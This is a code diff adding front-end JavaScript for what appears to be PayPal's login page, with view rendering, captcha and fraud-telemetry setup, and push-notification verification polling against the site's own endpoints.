+		var rememberProfileDom = document.querySelector('#rememberProfilePassword');
+		var pwrButton = document.querySelector('.forgotLink');
+		var phoneField = document.querySelector('#phone');
+		// HACK TO SOLVE PASSWORD PREFILL WHENCE CAPTCHA UNTIL INTEGRATION WITH RATELIMITER3
+		/*
+		* START OF HACK
+		*/
+		var passwordFieldWhenCaptcha = document.querySelector('#splitEmail input[type="password"]');
+
+		if (passwordFieldWhenCaptcha && passwordFieldWhenCaptcha.value.trim()) {
+			passwordField.value = passwordFieldWhenCaptcha.value;
+			passwordFieldWhenCaptcha.value = '';
+		}
+		/*
+		* END OF HACK
+		*/
+
+		if (model.splitLoginContext === 'inputPassword' || model.splitLoginContext === 'inputPin') {
+			if (splitPasswordAndPinDom && model.tpdVariant !== 'autoSend') {
+				// Do not change views behind spinner when auto-triggering PN
+				$(splitPasswordAndPinDom).removeClass('hide');
+			}
+			setSmartLockView(model);
+
+			if (rememberProfileDom) {
+				rememberProfileDom.checked = model.rememberProfile === 'true' || model.rememberProfile === true;
+			}
+			// show PWR only when phonePassword enabled and it is password field to be displayed
+			if (model.splitLoginContext === 'inputPassword' && !model.tpdVariant) {
+				pwrButton && $(pwrButton).removeClass('hide');
+			}
+
+			if ($(passwordField).attr('disabled') === 'disabled') {
+				passwordField.removeAttribute('disabled');
+			}
+
+			// Do not log "password page rendered" when other pages take over
+			if (model.smartlockStatus !== 'linked' && !model.verification) {
+				instrumentSplitPasswordRendered(model);
+			}
+
+		} else {
+			splitPasswordAndPinDom && $(splitPasswordAndPinDom).addClass('hide');
+			passwordField.value = '';
+			if (pinField) {
+				pinField.value = '';
+			}
+		}
+
+		if (splitPasswordSection && model.splitLoginContext === 'inputPassword') {
+			splitPinSection && $(splitPinSection).addClass('hide');
+			$(splitPasswordSection).removeClass('hide');
+		}
+
+		if (splitPinSection && model.splitLoginContext === 'inputPin') {
+			$(splitPasswordSection).addClass('hide');
+			$(splitPinSection).removeClass('hide');
+		}
+		// set the phone from profile in the field as well.
+		if (model.profile && model.profile.phone && phoneField) {
+			phoneField.value = model.profile.phone;
+		}
+		$('body').hasClass('desktop') && passwordField.focus();
+	}
+
+	function updateProfileView(model) {
+		var splitLoginContext = document.querySelector('input[name=splitLoginContext]');
+		var profileDisplayEmail = document.querySelector('.profileDisplayEmail');
+		var profileDisplayName = document.querySelector('.profileDisplayName');
+		var profileRememberedEmail = document.querySelector('.profileRememberedEmail');
+		var profileIcon = document.querySelector('.profileIcon');
+		var email = document.querySelector('#email');
+		var profileDisplayPhoneCode = document.querySelector('.profileDisplayPhoneCode');
+		var displayEmailPhone;
+
+		// Do not change views behind spinner when auto-triggering PN
+		if (model.tpdVariant === 'autoSend') {
+			return;
+		}
+
+		if (!model.profile) {
+			if (profileIcon) {
+				// Hide profileIcon
+				$(profileIcon).addClass('hide');
+				// Empty profileIcon contents if any
+				$(profileIcon).text('');
+				// Get rid of any style
+				profileIcon.removeAttribute('style');
+				// Get rid off any profile image
+				$(profileIcon).removeClass('profilePhoto');
+				// Get rid off any initials
+				$(profileIcon).removeClass('profileInitials');
+				// Add placeholder image profilePlaceHolderImg
+				$(profileIcon).addClass('profilePlaceHolderImg');
+			}
+			// Remove profileDisplayName
+			profileDisplayEmail && $(profileDisplayEmail).text('');
+			// Remove profileDisplayPhoneCode
+			profileDisplayPhoneCode && $(profileDisplayPhoneCode).text('');
+			profileDisplayName && $(profileDisplayName).addClass('hide');
+			// Remove any email
+			email.value = '';
+			// Hide container
+			profileRememberedEmail && $(profileRememberedEmail).addClass('hide');
+			// Displace footer
+			window.dispatchEvent && window.dispatchEvent(createNewEvent('resize'));
+			return;
+		}
+
+		// Profile with email pr phone is to be ignored in case of email or phone page
+		displayEmailPhone = model.profile.phone || model.profile.email;
+		if (displayEmailPhone && model.splitLoginContext !== 'inputEmail' && model.splitLoginContext !== 'inputPhone') {
+			// update display email
+			profileDisplayEmail && $(profileDisplayEmail).text(displayEmailPhone);
+			// show display email/phone & not you container
+			profileRememberedEmail && $(profileRememberedEmail).removeClass('hide');
+		}
+
+		if (model.profile.phoneCode && profileDisplayPhoneCode) {
+			$(profileDisplayPhoneCode).text(model.profile.phoneCode);
+		}
+	};
+
+	function updateSignupView(model) {
+
+		// Update ulPage param in signup link only if there is a value set to such param
+		// This behavior currently applies only for Account Match flow (accNoMatch = 'redirect')
+		function updateHref(url, newVal) {
+			var currentVal = login.utils.getQueryParamFromUrl('ulPage', url);
+			if (currentVal) {
+				return login.utils.updateParamValue(url, 'ulPage', newVal);
+			}
+
+			// Return current URL value if ulPage value not updated
+			return url;
+		}
+
+		var $signupContainer = $(document.querySelector('#signupContainer'));
+		var isEmailPage = model.splitLoginContext === 'inputEmail' ||
+			model.splitLoginContext === 'inputPhone';
+		var hideSignupOnEmailPage, hideSignupOnPasswordPage,
+			$signupLink, href;
+
+		if (!$signupContainer) {
+			return;
+		}
+		$signupLink = $(signupContainer.querySelector('#createAccount'));
+
+		hideSignupOnEmailPage = $signupContainer.data('hideOnEmail') === 'true';
+		hideSignupOnPasswordPage = $signupContainer.data('hideOnPass') === 'true';
+		href = $signupLink && $signupLink.attr('href');
+
+		// On email page
+		if (isEmailPage) {
+			if (hideSignupOnEmailPage) {
+				$signupContainer.addClass('hide');
+			} else {
+				$signupContainer.removeClass('hide');
+			}
+			$signupLink && $signupLink.attr('href', updateHref(href, 'email'));
+		// On Password page
+		} else {
+			// In in any xhr the response is to hide sign up
+			if (hideSignupOnPasswordPage) {
+				$signupContainer.addClass('hide');
+			} else {
+				$signupContainer.removeClass('hide');
+			}
+			$signupLink && $signupLink.attr('href', updateHref(href, 'pwd'));
+		}
+	}
+
+	function updateVerificationView(model) {
+		var footer = document.querySelector('footer');
+		var loginSection = document.querySelector('#login');
+		var loginContentContainer = document.querySelector('#login .contentContainer');
+		var verificationContentContainer = document.querySelector('#verification .contentContainer');
+		var verificationSection = document.querySelector('#verification');
+		var activeContent;
+		if (model.verification) {
+			activeContent = document.querySelector('.activeContent');
+			$(loginSection).addClass('hide');
+			$(verificationSection) && $(verificationSection).removeClass('hide');
+			$(footer).addClass('footerWithIcon');
+			$(activeContent).removeClass('activeContent');
+			// Required for displacing footer on window.resize
+			$(verificationContentContainer) && $(verificationContentContainer).addClass('activeContent');
+			updatePendingView(model.verification);
+			login.tpdLogin && login.tpdLogin.instrumentVerificationViewRendered();
+		} else {
+			activeContent = document.querySelector('.activeContent');
+			$(loginSection).removeClass('hide');
+			$(verificationSection) && $(verificationSection).addClass('hide');
+			$(footer).removeClass('footerWithIcon');
+			$(activeContent).removeClass('activeContent');
+			$(loginContentContainer).addClass('activeContent');  // Required for displacing footer on window.resize
+		}
+	}
+
+	function updatePendingView(verificationModel) {
+		if (!verificationModel) {
+			return;
+		}
+
+		var account = document.querySelector('.account');
+		var pin = document.querySelector('.mobileNotification .pin');
+		var twoDigitPin = document.querySelector('.twoDigitPin');
+		var uncookiedMessage = document.querySelector('#uncookiedMessage');
+		var cookiedMessage = document.querySelector('#cookiedMessage');
+		$(account).text(verificationModel.email);
+		if (verificationModel.pin && pin) {
+			$(pin).text(verificationModel.pin);
+			$(twoDigitPin).text(verificationModel.pin);
+			twoDigitPin.setAttribute('style', 'font-weight: bold');
+			$(uncookiedMessage).removeClass('hide');
+		} else {
+			$(cookiedMessage).removeClass('hide');
+		}
+	};
+
+	function updateNotificationView(model) {
+		var notifications = document.querySelectorAll('.notifications');
+		// Empty notifications by default
+		// TODO: Fix this multiple notifications maintenance
+		for (var i = 0; i < notifications.length; i++) {
+			$(notifications[i]).text('');
+			if (model.notifications && model.notifications.msg) {
+				notifications[i].innerHTML = '<p class="notification ' +
+					model.notifications.type + '" role="alert">' + model.notifications.msg + '</p>';
+			}
+		}
+	}
+
+	function updateSubHeaderView(model) {
+		// Toggle email and password sub header
+		var emailSubTagLine = document.querySelector('#emailSubTagLine');
+		var phoneSubTagLine = document.querySelector('#phoneSubTagLine');
+		var pwdSubTagLine = document.querySelector('#pwdSubTagLine');
+
+		if (model.splitLoginContext === 'inputPassword' || model.splitLoginContext === 'inputPin') {
+			emailSubTagLine && $(emailSubTagLine).addClass('hide');
+			phoneSubTagLine && $(phoneSubTagLine).addClass('hide');
+			pwdSubTagLine && $(pwdSubTagLine).removeClass('hide');
+		} else if (model.splitLoginContext === 'inputPhone') {
+			// if landed in splitPhone page show the phone sub tag and hide email sub tag
+			phoneSubTagLine && $(phoneSubTagLine).removeClass('hide');
+			emailSubTagLine && $(emailSubTagLine).addClass('hide');
+			pwdSubTagLine && $(pwdSubTagLine).addClass('hide');
+		} else {
+			emailSubTagLine && $(emailSubTagLine).removeClass('hide');
+			phoneSubTagLine && $(phoneSubTagLine).addClass('hide');
+			pwdSubTagLine && $(pwdSubTagLine).addClass('hide');
+		}
+	};
+	// TODO: Move this (and all randomly sprinkled metrics calls) to a separate file and use with pubsub to trigger it
+	function instrumentFirstSplitPageRendered() {
+		var isHybrid = login.utils.isHybridLoginExperience();
+		login.logger.log({
+			evt: 'state_name',
+			data: isHybrid ? 'begin_hybrid_login' : 'begin_email',
+			instrument: true
+		});
+		login.logger.log({
+			evt: 'transition_name',
+			data: isHybrid ? 'prepare_hybrid' : 'prepare_email',
+			instrument: true
+		});
+		login.logger.log({
+			evt: 'is_cookied',
+			data: 'N',
+			instrument: true
+		});
+		login.logger.pushLogs();
+	}
+
+	function instrumentSplitPasswordRendered(model) {
+		var passwordField = document.querySelector('#password');
+		var phoneField = document.querySelector('#phone');
+		var isPasswordAutofilled = login.utils.isFieldPrefilled(passwordField);
+		var isHybrid = login.utils.isHybridLoginExperience();
+		var transitionName = isHybrid ? 'prepare_hybrid_pwd' : 'prepare_pwd';
+		transitionName += (login.utils.getKmliCb() ? '_ot' : '');
+
+		if (document.querySelector('#moreOptionsContainer') && model.moreOptions === true) {
+			transitionName = transitionName + '_more_opt';
+			login.logger.log({
+				evt: 'exp_shown',
+				data: 'tpd',
+				instrument: true
+			});
+		}
+
+		login.logger.log({
+			evt: 'state_name',
+			data: isHybrid ? 'begin_hybrid_pwd' : 'begin_pwd',
+			instrument: true
+		});
+		login.logger.log({
+			evt: 'pub_cred_type',
+			data: (phoneField && phoneField.value) ? 'phone' : 'email',
+			instrument: true
+		});
+		login.logger.log({
+			evt: 'transition_name',
+			// Append `_ot` only if One Touch (KMLI) checkbox is enabled for this request
+			data: transitionName,
+			instrument: true
+		});
+		login.logger.log({
+			evt: 'is_cookied',
+			data: 'Y',
+			instrument: true
+		});
+		login.logger.log({
+			evt: 'autofill',
+			data: isPasswordAutofilled ? 'Y' : 'N',
+			instrument: true
+		});
+		login.logger.pushLogs();
+	}
+
+	function updateCaptchaDom(model) {
+		var captchaDom;
+
+		function changeVisibility(makeVisible) {
+			var captchaContainers = document.querySelectorAll('.captcha-container');
+			for (var i = 0; i < captchaContainers.length; i++) {
+				if (makeVisible) {
+					$(captchaContainers[i]).removeClass('hide');
+				} else {
+					// Make inivisble
+					$(captchaContainers[i]).addClass('hide');
+				}
+			}
+		}
+
+		changeVisibility(model.captcha);
+
+		if (!model.captcha) {
+			return;
+		}
+
+		captchaDom = login.utils.getActiveCaptchaElement({value: model.splitLoginContext});
+		if (!captchaDom) {
+			return;
+		}
+
+		if (model.captcha.captchaImgUrl && captchaDom.image) {
+			captchaDom.image.setAttribute('src', model.captcha.captchaImgUrl);
+		}
+
+		if (model.captcha.captchaAudioUrl && captchaDom.audioTag) {
+			captchaDom.audioTag.setAttribute('src', model.captcha.captchaAudioUrl);
+		}
+
+		if (model.captcha.captchaAudioUrl && captchaDom.audioLink) {
+			captchaDom.audioLink.setAttribute('href', model.captcha.captchaAudioUrl);
+		}
+	}
+
+	function updateViewAfterAds(model) {
+		if (!model.adsChallengeVerified) {
+			return;
+		}
+
+		// ADS captcha was verified so we have to toggle back the DOM
+		$('#login').removeClass('hide');
+
+		if (document.getElementById('ads-container')) {
+			document.getElementById('ads-container').style.display = 'none';
+		}
+	}
+
+	// Initialize store as a global variable and subscribe to state updates
+	login.storeInstance = login.store();
+	login.pubsub.subscribe('STATE_UPDATED', render);
+
+	return {
+		render: render,
+		updateNotificationView: updateNotificationView
+	};
+}());
+
+(function() {
+	if (typeof Object.assign !== 'function') {
+		Object.assign = function(target, varArgs) { // .length of function is 2
+			'use strict';
+			if (target === null) { // TypeError if undefined or null
+				throw new TypeError('Cannot convert undefined or null to object');
+			}
+
+			var to = Object(target);
+
+			for (var i = 1; i < arguments.length; i++) {
+				var nextSource = arguments[i];
+
+				if (nextSource !== null) { // Skip over if undefined or null
+					for (var nextKey in nextSource) {
+						// Avoid bugs when hasOwnProperty is shadowed
+						if (Object.prototype.hasOwnProperty.call(nextSource, nextKey)) {
+							to[nextKey] = nextSource[nextKey];
+						}
+					}
+				}
+			}
+			return to;
+		}
+	}
+
+	if (!String.prototype.trim) {
+		String.prototype.trim = function() {
+			return this.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, '');
+		};
+	}
+}());
+
+// FRAUDNET
+login.fn = (function() {
+	'use strict';
+
+	// This will not and cannot ever change.
+	var fncls = 'fnparams-dede7cc5-15fd-4c75-a9f4-36c430ee3a99';
+
+	function _injectConfig(options) {
+		var script = document.getElementById('fconfig');
+
+		if (script) {
+			if (script.parentNode) {
+				script.parentNode.removeChild(script);
+			}
+		}
+
+		script = document.createElement('script');
+		script.id = 'fconfig';
+		script.type = 'application/json';
+		script.setAttribute('fncls', fncls);
+		script.setAttribute('nonce', $('body').data('nonce'));
+		script.text = '{"f":"' + options.fnSessionId + '","s":"' + options.sourceId + '","b":"' + options.beaconUrl + '"}';
+		document.body.appendChild(script);
+	}
+
+	function _loadBeaconJS(options) {
+		var script = document.createElement('script');
+		script.src = options.fnUrl;
+		script.onload = function() {
+			_enableSpeedTyping(options);
+		};
+		document.body.appendChild(script);
+	}
+
+	function _enableSpeedTyping(options) {
+		if (options.enableSpeedTyping && typeof initTsFb === 'function') {
+			initTsFb({
+				detail: {
+					type: 'UL',
+					fields: ['email', 'password']
+				}
+			});
+		}
+	}
+
+	/**
+	 * Collects fraudnet telemetry & checksum data using the inlined fnsync script file
+	 * @param {Object} options
+	 */
+	function initializeFnSync(options) {
+		if (PAYPAL.syncData && typeof PAYPAL.syncData.initSync === 'function' && options) {
+			options.detail = {
+				type: 'UL',
+				fields: ['email', 'password']
+			};
+			PAYPAL.syncData.initSync(options);
+		}
+	}
+
+	/**
+	 * Adds the collected the fraudnet sync data to the hidden form input
+	 */
+	function addFnSyncData() {
+		if (PAYPAL.syncData && typeof PAYPAL.syncData.flushData === 'function') {
+			try {
+				PAYPAL.syncData.flushData();
+			} catch (e) {}
+		}
+	}
+
+	/**
+	 * Uses the updated source ID from each XHR call on any view change to collect sync again
+	 * @param {Object} data
+	 */
+	function updateFnSyncContext(data) {
+		if (data && data.sourceId && typeof PAYPAL.ulSync === 'object') {
+			PAYPAL.ulSync.sourceId = data.sourceId;
+			initializeFnSync(PAYPAL.ulSync);
+		}
+	}
+
+	/**
+	 * Check to initiate fn on web view
+	 */
+	function isWebViewSupported() {
+		var enableFnBeaconOnWebViews = $('body').data('enableFnBeaconOnWebViews');
+
+		if (!enableFnBeaconOnWebViews &&
+			(/(iPhone|iPod|iPad).*AppleWebKit(?!.*Safari)/i).test(window.navigator.userAgent)) {
+			return false;
+		}
+
+		return true;
+	}
+
+	function initialize() {
+		// Trigger fraudnet beacon (only if not in web view)
+		if (isWebViewSupported() && PAYPAL && PAYPAL.ulData) {
+			_injectConfig(PAYPAL.ulData);
+			_loadBeaconJS(PAYPAL.ulData);
+		}
+		initializeFnSync(PAYPAL.ulSync);
+	}
+
+	return {
+		initialize: initialize,
+		initializeFnSync: initializeFnSync,
+		addFnSyncData: addFnSyncData,
+		updateFnSyncContext: updateFnSyncContext
+	}
+}());
+
+login.verification = (function() {
+	var maxPollAttempts = 9;
+	var count = 0;
+	var showResendLinkDelay = 5000;
+	var unhideResendLinkDelay = 3000;
+	var maxResendAttempts = 3;
+	var resendCount = 0;
+	var csrfField = document.querySelector('input[name=_csrf]');
+	var localeField = document.querySelector('input[name="locale.x"]');
+	var activeXhr;
+	var isPolling = false;
+	var accessToken, authflowDocumentId, email;
+	var verificationSection = document.querySelector('#verification');
+	var verificationSubSection = document.querySelector('.verificationSubSection');
+	var expiredSubSection = document.querySelector('#expired');
+	var deniedSubSection = document.querySelector('#denied');
+	var expiredTryAgainButton = document.querySelector('#expiredTryAgainButton');
+	var pendingNotYouLink = document.querySelector('#pendingNotYouLink');
+	var tryPasswordLink = document.querySelector('#pending #tryPasswordLink');
+	var resendLink = document.querySelector('#resend');
+	var sentMessage = document.querySelector('.sentMessage');
+	var passwordInsteadDropDown = document.querySelector('#passwordInsteadDropDown');
+	var passwordInsteadGroup = document.querySelector('#passwordInsteadGroup');
+	var loginSection = document.querySelector('#login');
+	var tpdExperience, pnApprove, tpdTriggerMethod;
+
+	var pollingXhrSuccessHandler = function(response) {
+		if (!response) {
+			poll();
+		}
+
+		// Update CSRF
+		csrfField.value = response._csrf || csrfField.value;
+		switch (response.pollStatus) {
+			case 'Accepted':
+				stopPolling();
+				pnApprove = pnApprove ? false : response.pollStatus === 'Accepted';
+				if (pnApprove) {
+					login.logger.log({
+						evt: 'TPD_CLIENT',
+						data: 'Approved_' + response.tpdTriggerMethod,
+						calEvent: true
+					});
+					login.logger.pushLogs();
+				}
+				// last login call
+				completeLogin();
+				break;
+
+			case 'Downgraded':
+				// pending
+				poll();
+				break;
+
+			case 'Denied':
+				stopPolling();
+				$(verificationSubSection).addClass('hide');
+				$(deniedSubSection).removeClass('hide');
+				break;
+
+			case 'Failed':
+				stopPolling();
+				// Show inputPassword section with notification
+				showPasswordView(response);
+				break;
+
+			default:
+				// Error
+				if (response.errorView) {
+					showExpiredView();
+					login.tpdLogin.instrumentTpdExpired('RCS_SERVICE_ERROR');
+				} else {
+					poll();
+				}
+				break;
+		}
+	};
+
+	function showPasswordView(response) {
+		login.utils.updateView({
+			splitLoginContext: 'inputPassword',
+			profile: {
+				email: email
+			},
+			verification: null,
+			notifications: response.notifications
+		});
+	}
+	function showExpiredView() {
+		var expiredNotification;
+		var expiredMsg = document.querySelector('#expired .slimP');
+		if (expiredMsg && expiredMsg.textContent) {
+			expiredNotification = {
+				msg: expiredMsg && expiredMsg.textContent,
+				type: 'notification-warning'
+			};
+		}
+		login.utils.updateView({
+			splitLoginContext: 'inputPassword',
+			profile: {
+				email: email
+			},
+			tpdVariant: tpdExperience,
+			verification: null,
+			ulSync: getFnSourceId('inputPassword'),
+			notifications: expiredNotification
+		});
+	}
+	function getFnSyncData() {
+		if (PAYPAL.syncData && typeof PAYPAL.syncData.data === 'object') {
+			return JSON.stringify(PAYPAL.syncData.data);
+		}
+	}
+
+	function getFnSourceId(context) {
+		var sourceId = PAYPAL.ulSync && PAYPAL.ulSync.sourceId || '';
+		var remembered = sourceId.indexOf('REMEMBERED') !== -1 ? '_REMEMBERED' : '';
+		var fnContext = {
+			'inputPassword': 'UNIFIED_LOGIN_INPUT_PASSWORD'
+		};
+
+		return {
+			sourceId: fnContext[context] + remembered
+		};
+	}
+
+	function completeLogin() {
+		var rememberProfile = login.storeInstance.getState().model.rememberProfile;
+		var data = {
+			_csrf: csrfField.value,
+			intent: 'completeLogin',
+			accessToken: accessToken,
+			'locale.x': localeField.value,
+			rememberProfile: rememberProfile === 'true' || rememberProfile === true,
+			// Send login_email in order to have it in account details to be able to drop RMUC for TPD
+			login_email: email,
+			flowId: login.utils.getFlowId(),
+			tpdVariant: tpdExperience,
+			tpdTriggerMethod: tpdTriggerMethod
+		};
+		var fnSyncData = getFnSyncData();
+
+		if (fnSyncData) {
+			data.fn_sync_data = fnSyncData;
+		}
+
+		if (login.utils.getCtxId()) {
+			data.ctxId = login.utils.getCtxId();
+		}
+		$.ajax({
+			url: '/signin/challenge/push?intent=' + login.utils.getIntent(),
+			type: 'POST',
+			data: data,
+			success: function(response) {
+				if (response && response.pollStatus === 'LoggedIn' && response.returnUrl) {
+					return window.location.href = response.returnUrl;
+				}
+
+				if (response && response.pollStatus === 'Failed') {
+					return showPasswordView(response);
+				}
+				showExpiredView();
+				// No response or an undefined/unrecognized pollStatus
+				login.tpdLogin.instrumentTpdExpired('NO_RESPONSE');
+			}
+		});
+	}
+
+	function poll() {
+		// exit clauses
+		if (!isPolling) {
+			return;
+		}
+		if (count >= maxPollAttempts) {
+			// show password page when Push Notification expired
+			showExpiredView();
+			login.tpdLogin.instrumentTpdExpired('NO_ACTION');
+			return;
+		}
+		// stop polling from external code
+
+		// update counter
+		count++;
+		// make a xhr request to UL server & it responds with :
+		activeXhr = $.ajax({
+			url: '/signin/challenge/push',
+			type: 'POST',
+			data: {
+				_csrf: csrfField.value,
+				intent: 'poll',
+				accessToken: accessToken,
+				authflowDocumentId: authflowDocumentId,
+				retryCount: count,
+				'locale.x': localeField.value,
+				flowId: login.utils.getFlowId(),
+				tpdVariant: tpdExperience,
+				tpdTriggerMethod: tpdTriggerMethod
+			},
+			success: pollingXhrSuccessHandler,
+			fail: function() {
+				// error (ccp is down, our box goes down, xhr fails/times out)
+				if (isPolling) {
+					poll();
+				}
+			}
+		});
+	}
+
+	function showSurvey(event) {
+		event.preventDefault();
+		$(passwordInsteadDropDown).removeClass('hide');
+
+	}
+
+	function startPolling(params) {
+		var loginForm = document.querySelector('form[name=login]');
+		var hiddenElement;
+		params = params || {};
+		isPolling = true;
+		accessToken = params.accessToken || accessToken;
+		authflowDocumentId = params.authflowDocumentId || authflowDocumentId;
+		email = params.email || email;
+		count = 0;
+		// override only when params has variant
+		tpdExperience = params.variant || tpdExperience;
+		tpdTriggerMethod = params.tpdTriggerMethod || tpdTriggerMethod;
+		poll();
+
+		// Add docId as hidden element to support TPD automation
+		hiddenElement = document.querySelector('[name=authdocId]');
+		if (!hiddenElement) {
+			login.utils.addHiddenElement('authdocId', authflowDocumentId, loginForm);
+		} else {
+			hiddenElement.setAttribute('value', authflowDocumentId);
+		}
+	}
+
+	function expiredTryAgainHandler() {
+		window.location.href = window.location.href;
+	}
+
+	if (expiredTryAgainButton) {
+		expiredTryAgainButton.onclick = expiredTryAgainHandler;
+	}
+
+	if (pendingNotYouLink) {
+		pendingNotYouLink.onclick = function(event) {
+			stopPolling();
+			login.tpdLogin.instrumentNotYouClicked();
+			login.utils.notYouClickHandler(event);
+		};
+	}
+	function togglePasswordInstead(event) {
+		var evtTarget = getEventTarget(event);
+		if (!passwordInsteadDropDown) {
+			return;
+		}
+		if ($(evtTarget).hasClass('showSurvey')) {
+			return;
+		}
+		// any other place, hide the dropdown
+		$(passwordInsteadDropDown).addClass('hide');
+	}
+
+	function usePasswordInstead(event) {
+		var tpdEventTarget = getEventTarget(event);
+		var reason = $(tpdEventTarget).data('reason');
+		event.preventDefault();
+		$(resendLink).addClass('hide');
+		$(resendLink).removeClass('greyOut');
+		stopPolling();
+		login.tpdLogin.instrumentUsePasswordInstead(reason);
+		if (verificationSection) {
+			$(verificationSection).addClass('hide');
+		}
+		if (loginSection) {
+			$(loginSection).removeClass('hide');
+		}
+	}
+
+	function stopPolling() {
+		isPolling = false;
+		activeXhr.abort();
+	}
+
+	function showResendLink() {
+		resendCount = 0;
+		setTimeout(function() {
+			$(resendLink).removeClass('hide');
+		}, showResendLinkDelay);
+	}
+
+	function resendPushNotification(event) {
+		event.preventDefault();
+		if ($(event.target).hasClass('greyOut')) {
+			return;
+		}
+
+		login.tpdLogin.instrumentResendClicked();
+		stopPolling();
+		// Reset poll counter
+		count = 0;
+		$(resendLink).addClass('greyOut');
+		resendCount++;
+		$.ajax({
+			url: '/signin/challenge/push',
+			type: 'POST',
+			data: {
+				_csrf: csrfField.value,
+				intent: 'resend',
+				accessToken: accessToken,
+				authflowDocumentId: authflowDocumentId,
+				'locale.x': localeField.value,
+				flowId: login.utils.getFlowId(),
+				tpdVariant: tpdExperience,
+				tpdTriggerMethod: tpdTriggerMethod
+			},
+			success: function resendSuccess(response) {
+				if (response && response.resendStatus === 'Success') {
+					startPolling({
+						accessToken: accessToken,
+						authflowDocumentId: authflowDocumentId,
+						email: email
+					});
+					$(resendLink).addClass('hide');
+					$(sentMessage).removeClass('hide');
+					setTimeout(function() {
+						$(sentMessage).addClass('hide');
+						if (resendCount < maxResendAttempts) {
+							$(resendLink).removeClass('hide');
+							$(resendLink).removeClass('greyOut');
+						}
+					}, unhideResendLinkDelay);
+					return;
+				}
+
+				if (response && response.notifications) {
+					login.view.updateNotificationView(response);
+				}
+			},
+			fail: function noOp() {
+			}
+		});
+	}
+
+	function updateView(model) {
+		var moreOptionsContainer = document.querySelector('#moreOptionsContainer');
+		var tpdButtonContainer = document.querySelector('#tpdButtonContainer');
+		var tpdEligible = document.querySelector('input[name="tpdEligible"]');
+		var loginForm = document.querySelector('form[name=login]');
+		var tpdEligibleInput;
+		var btnNext = document.querySelector('#btnNext');
+		// safety check
+		if (!model || !tpdButtonContainer || !moreOptionsContainer) {
+			return;
+		}
+		// TODO check why formdata was not set when set in model in xhr response
+		if (model.tpdVariant || model.tpdAutoSend) {
+			if (tpdEligible) {
+				tpdEligible.value = 'true';
+			} else {
+				tpdEligibleInput = document.createElement('input');
+				tpdEligibleInput.setAttribute('type', 'hidden');
+				tpdEligibleInput.setAttribute('name', 'tpdEligible');
+				tpdEligibleInput.setAttribute('value', 'true');
+				$(loginForm).append(tpdEligibleInput);
+			}
+		}
+		if (model.tpdVariant === 'moreOptions') {
+			$(moreOptionsContainer).removeClass('hide');
+			$('.forgotLink').addClass('hide');
+		}
+		if (model.tpdVariant === 'tpdButton') {
+			$(moreOptionsContainer).addClass('hide');
+			$(tpdButtonContainer).removeClass('hide');
+			$('.forgotLink').removeClass('hide');
+			$('#signupContainer').addClass('hide');
+		}
+		// Auto send push notification (conditionally)
+		if (model.tpdAutoSend) {
+			login.tpdLogin && login.tpdLogin.instrumentTpdLoginAutoTriggered();
+			login.tpdLogin && login.tpdLogin.attemptTpdLogin('autoSend');
+		}
+		if (model.splitLoginContext === 'inputEmail') {
+			$(moreOptionsContainer).addClass('hide');
+			$(tpdButtonContainer).addClass('hide');
+			if (tpdEligible && tpdEligible.value === 'true') {
+				tpdEligible.value = '';
+			}
+		}
+		// for usePasswordInstead on PN page to go back to password page in demo flow
+		if (login.utils.isTpdDemo() && model.splitLoginContext !== 'inputEmail') {
+			var splitPasswordSection = document.querySelector('#splitPassword');
+			btnNext && $(btnNext).addClass('hide');
+			splitPasswordSection && $(splitPasswordSection).removeClass('hide');
+		} else {
+			// for click change in tpd Demo flow
+			btnNext && $(btnNext).removeClass('hide');
+		}
+	}
+
+	// Attach events
+	if (login.pubsub) {
+		login.pubsub.subscribe('WINDOW_CLICK', togglePasswordInstead);
+	}
+	// Attach event to usePasswordInstead Link
+	if (tryPasswordLink && $(tryPasswordLink).hasClass('showSurvey')) {
+		addEvent(tryPasswordLink, 'click', showSurvey);
+		addEvent(passwordInsteadGroup, 'click', usePasswordInstead);
+	} else if (tryPasswordLink) {
+		addEvent(tryPasswordLink, 'click', usePasswordInstead);
+	}
+	addEvent(resendLink, 'click', resendPushNotification);
+
+	return {
+		startPolling: startPolling,
+		showResendLink: showResendLink,
+		updateView: updateView
+	};
+
+}());
+
+// LOGIN
+login.core = (function() {
+	return function core() {
+		/*
+		 * Put together dom objects for email, password, phone, pin such that they can be easily passed to validator
+		 * methods with a common interface
+		 */
+		var XHR_LOGIN_CAL_TYPE = 'XHR_LOGIN';
+		var notifications = document.querySelector('#notifications');
+		var splitLoginCookiedFallback = document.querySelector('input[name="splitLoginCookiedFallback"]');
+		// The Email DOM contains the email field and it's associated error messages
+		var emailDom = {
+			container: document.querySelector('#login_emaildiv'),
+			field: document.querySelector('#email'),
+			label: document.querySelector('label[for="email"]'),
+			errMsgContainer: document.querySelector('#emailErrorMessage'),
+			errMsg: document.querySelector('#emailErrorMessage .emptyError'),
+			invalidMsg: document.querySelector('#emailErrorMessage .invalidError'),
+			phoneEmailToggleIcon: document.querySelector('#login_emaildiv .icon'),
+			type: 'email'
+		};
+
+		var emailMaskDOM = document.querySelector('.textInputMask.email');
+
+		// The Password DOM contains the password field and it's associated error messages
+		var passwordDom = {
+			container: document.querySelector('#login_passworddiv'),
+			field: document.querySelector('#password'),
+			errMsgContainer: document.querySelector('#passwordErrorMessage'),
+			errMsg: document.querySelector('#passwordErrorMessage .emptyError')
+		};
+
+		// The Phone country code DOM contains the list of two letter phone country code
+		var phoneCodeDom = {
+			container: document.querySelector('#pinSection') || document.querySelector('.splitPhoneSection'),
+			field: document.querySelector('#phoneCode')
+		};
+
+		// The Phone DOM contains the phone field and it's associated error messages
+		var phoneDom = {
+			container: document.querySelector('#login_phonediv'),
+			field: document.querySelector('#phone'),
+			errMsgContainer: document.querySelector('#phoneErrorMessage'),
+			errMsg: document.querySelector('#phoneErrorMessage .emptyError'),
+			invalidMsg: document.querySelector('#phoneErrorMessage .invalidError')
+		};
+
+		// The Pin DOM contains the pin field and it's associated error messages
+		var pinDom = {
+			container: document.querySelector('#login_pindiv'),
+			field: document.querySelector('#pin'),
+			errMsgContainer: document.querySelector('#pinErrorMessage'),
+			errMsg: document.querySelector('#pinErrorMessage .emptyError')
+		};
+
+		var splitLoginContextField = document.querySelector('input[name=splitLoginContext]');
+
+		var loginForm = document.querySelector('.proceed');
+
+		// Login buttons
+		var btnNext = document.querySelector('#btnNext');
+		var btnLogin = document.querySelector('#btnLogin');
+
+		// Actions button
+		var btnActions = document.querySelector('.actions');
+
+		// Email & Password Section and Phone & Pin Sections
+		var passwordSection = document.querySelector('#splitEmailSection') || document.querySelector('#passwordSection');
